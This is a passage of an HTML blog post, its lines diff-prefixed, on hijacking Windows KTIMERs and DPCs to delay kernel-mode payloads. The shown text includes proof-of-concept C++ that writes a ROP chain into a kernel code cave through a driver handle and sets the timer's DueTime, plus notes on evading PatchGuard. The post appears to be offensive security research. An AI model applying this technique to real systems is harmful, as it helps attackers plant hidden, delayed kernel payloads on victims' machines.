+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x150</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x72b676</span>); <span style=color:#75715e>// 0x72b676: pop rdx; ret; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x158</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x21a154</span>); <span style=color:#75715e>// 0x21a154: nop; ret;  (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x160</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x7bb073</span>); <span style=color:#75715e>// 0x7bb073: pop rcx ; ret ; (1 found)
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x168</span>, ptrRsp <span style=color:#f92672>-</span> <span style=color:#ae81ff>0x10</span>);              <span style=color:#75715e>// pointer to rsp minus 0x10
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x170</span>, (DWORD64)ntBase <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x42ce28</span>); <span style=color:#75715e>// 0x42ce28: mov rsp, qword [rcx+0x10] ; jmp rdx ; (1 found)
+</span><span style=color:#75715e></span>
+<span style=color:#75715e>//DATA
+</span><span style=color:#75715e></span>write64(hProcess, hDriver, codeCave <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x1a8</span>, <span style=color:#ae81ff>0x2a0</span>);              <span style=color:#75715e>// offset between r14 and original rsp
+</span></code></pre></div><h3 id=setting-the-duetime>Setting the DueTime<a hidden class=anchor aria-hidden=true href=#setting-the-duetime>#</a></h3>
+<p>Now that the execution flow is restored using the ROP chain we can actually hijack the KTIMER by setting the <code>DueTime</code> to a specific value.
+For this, we can calculate what interrupt time belongs to what absolute time by taking the ticks per second, interrupt time and system time into account.
+We chose to fire the KTIMER at a specific amount of seconds from the current interrupt time.
+The following code queues the hijacked DPC 10 seconds from now.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp>DWORD64 ticksPerSecond <span style=color:#f92672>=</span> <span style=color:#ae81ff>10000000</span>; <span style=color:#75715e>//100ns
+</span><span style=color:#75715e></span>DWORD64 seconds <span style=color:#f92672>=</span> <span style=color:#ae81ff>10</span>;
+DWORD64 fireTime <span style=color:#f92672>=</span> interruptTime <span style=color:#f92672>+</span> seconds <span style=color:#f92672>*</span> ticksPerSecond;
+
+write64(hProcess, hDriver, kTimer <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x18</span>, fireTime);
+printf(<span style=color:#e6db74>&#34;[+] Set DueTime to %d seconds from now.</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, seconds);
+</code></pre></div><h2 id=the-proof-is-in-the-pudding>The Proof is in the Pudding<a hidden class=anchor aria-hidden=true href=#the-proof-is-in-the-pudding>#</a></h2>
+<p>See the screenshot and screencapture below.
+We use Sysinternals Suite <a href=https://learn.microsoft.com/en-us/sysinternals/downloads/debugview>DebugView</a> to illustrate the proof of concept, making sure that we capture the kernel.
+Running the proof of concept, we notice that the exploiting process finishes before the hijack calls <code>nt!DbgPrintEx</code> after the specified delay, outputting the supplied debug string in DebugView!</p>
+<p><p align=center>
+<img loading=lazy src=proof.png alt="Proof of KTIMER hijacking">
+</p>
+</p>
+<div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden>
+<iframe src=https://www.youtube-nocookie.com/embed/JUdAwep-xy4 style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe>
+</div>
+<h2 id=a-note-on-patchguard>A Note on PatchGuard<a hidden class=anchor aria-hidden=true href=#a-note-on-patchguard>#</a></h2>
+<p>To draw some conclusions whether this technique gets detected by PatchGuard, we leave the &ldquo;ticking time bomb&rdquo; in the kernel on a build that has not enabled (remote) kernel debugging.
+We first confirm that the proof of concept code works by leaving the <code>DueTime</code> 10 seconds from the time we set the hijack.
+Next, we rerun the proof of concept setting the DueTime 24 hours from the time we set the hijack and see that it did not trigger a BSOD within these 24 hours.
+As a result, we conclude that PatchGuard is probably fine with our hijack.</p>
+<h2 id=thanks>Thanks<a hidden class=anchor aria-hidden=true href=#thanks>#</a></h2>
+<p>We gave a practical proof of concept of KTIMER hijacking, a novel post-exploitation technique that delays the execution of kernel-mode payloads.
+With KTIMER hijacking you can call any legit DPC routine or function pointer with kCFG and HVCI enabled, however, for arbitrary code execution kCFG has to be disabled.
+The proof of concept is HVCI compliant, so with an eventual kCFG bypass, or a system wide disable of kCFG during the KernelForge phase, &ldquo;ticking time bombs&rdquo; can be planted on modern Windows 11 builds.</p>
+<p>Thanks for taking the time to read this post. If you have any questions or remarks, reach out to me on <a href=https://x.com/gar_re>X</a> or <a href=https://discord.com/invite/offsec>Discord</a>.</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://gar-re.github.io/tags/post_exploitation/>post_exploitation</a></li>
+<li><a href=https://gar-re.github.io/tags/windows_internals/>windows_internals</a></li>
+</ul>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share Delaying Kernel Payloads by Hijacking KTIMERs & KDPCs (Part 2) on twitter" href="https://x.com/intent/tweet/?text=Delaying%20Kernel%20Payloads%20by%20Hijacking%20KTIMERs%20%26%20KDPCs%20%28Part%202%29&url=https%3a%2f%2fgar-re.github.io%2fposts%2fktimer-hijack-pt2%2f&hashtags=post_exploitation%2cwindows_internals"><svg id="svg5" xmlns:svg="http://www.w3.org/2000/svg" height="30" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 1250 1150" fill="currentcolor"><path id="path1009" d="M283.94 167.31l386.39 516.64L281.5 1104h87.51l340.42-367.76L984.48 1104h297.8L874.15 558.3l361.92-390.99h-87.51l-313.51 338.7-253.31-338.7H283.94zm128.69 64.46h136.81l604.13 807.76h-136.81L412.63 231.77z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2025 <a href=https://gar-re.github.io/>Gar Reversing</a></span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerHTML='copy';function d(){a.innerHTML='copied!',setTimeout(()=>{a.innerHTML='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
+</body>
+</html>
